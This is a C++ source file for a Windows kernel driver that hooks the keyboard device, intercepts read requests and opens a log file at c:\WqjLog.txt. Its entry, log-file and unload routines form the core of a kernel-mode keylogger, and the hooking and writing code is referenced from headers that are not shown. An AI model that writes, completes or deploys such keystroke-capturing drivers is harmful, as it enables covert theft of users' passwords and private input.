extern "C" {
#include <ntddk.h>
}
#include "common.h"
#include "KWrite.h"
#include "Klog.h"
#include "KHook.h"
long g_PendingWrite = 0;
extern "C" NTSTATUS DriverEntry( IN PDRIVER_OBJECT  pDriverObject, IN PUNICODE_STRING RegistryPath )
//extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING RegistryPath)
//passive
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	int i ;
	do{
		for (i=0; i<IRP_MJ_MAXIMUM_FUNCTION; i++)
		{
			pDriverObject->MajorFunction[i] = HookDevicePassThrough;
		}
		pDriverObject->MajorFunction[IRP_MJ_READ] = HookDeviceRead;
		pDriverObject->DriverUnload = HookDeviceUnload;
		Status = HookKeyboardDevice(pDriverObject);
		if (!NT_SUCCESS(Status))
			break;
		Status = InitWriteFileThread(pDriverObject);
		if (!NT_SUCCESS(Status))
			break;
		Status = OpenLogFile(pDriverObject);
		if (!NT_SUCCESS(Status))
			break;
		DbgPrint("DRIVER Initial success");
	}while (false);
	if (!NT_SUCCESS(Status))
	{
		DbgPrint("Error Code:%d",Status);
	}
	
	return Status;
}

NTSTATUS OpenLogFile(PDRIVER_OBJECT pDriverObject)
{//passive
	PDEVICE_EXTIONSION pKeyboardDeviceExtension = 
		(PDEVICE_EXTIONSION)pDriverObject->DeviceObject->DeviceExtension;
	WCHAR wFileName[] =L"\\DosDevices\\c:\\WqjLog.txt";
	UNICODE_STRING uFileName;
	OBJECT_ATTRIBUTES ObjAtr;
	IO_STATUS_BLOCK IoStatus;
	NTSTATUS Status ;
	
	RtlInitUnicodeString(&uFileName, wFileName);
	InitializeObjectAttributes(&ObjAtr, &uFileName, OBJ_KERNEL_HANDLE, NULL, NULL);
	//zwCreateFile(&handle,GENERIC_WRITE,ObjAtr,FILE_CREATED, &ioStatus, NULL,FILE_ATTRIBUTE_NORMAL, 
	//FILE_SHARE_READ,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL, 0);
	Status = ZwCreateFile(&pKeyboardDeviceExtension->hFile, GENERIC_WRITE, &ObjAtr, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	return Status;

}

VOID HookDeviceUnload(PDRIVER_OBJECT pDriverObject)
{//passive
	//删除设备，释放信号量，关闭文件
	PDEVICE_EXTIONSION pKeyboardDeviceExtension = 
		(PDEVICE_EXTIONSION)pDriverObject->DeviceObject->DeviceExtension;

	LARGE_INTEGER waitTime;
	KTIMER timer;
	KeInitializeTimer(&timer);
	waitTime.QuadPart = 1000000;
	while (g_PendingWrite>1)
	{
		KeSetTimer(&timer, waitTime, NULL);
		KeWaitForSingleObject(&timer, Executive, KernelMode, false, NULL);
	}
	pKeyboardDeviceExtension->bThreadTerminate = true;

	KeReleaseSemaphore(&pKeyboardDeviceExtension->sem, 0, 1, true);
	KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj, Executive, KernelMode, false, NULL);
	if (pKeyboardDeviceExtension->hFile!=NULL)
	{
		ZwClose(pKeyboardDeviceExtension->hFile);
	}
	if (pDriverObject->DeviceObject!=NULL)
	{
		IoDeleteDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	}

	return ;
}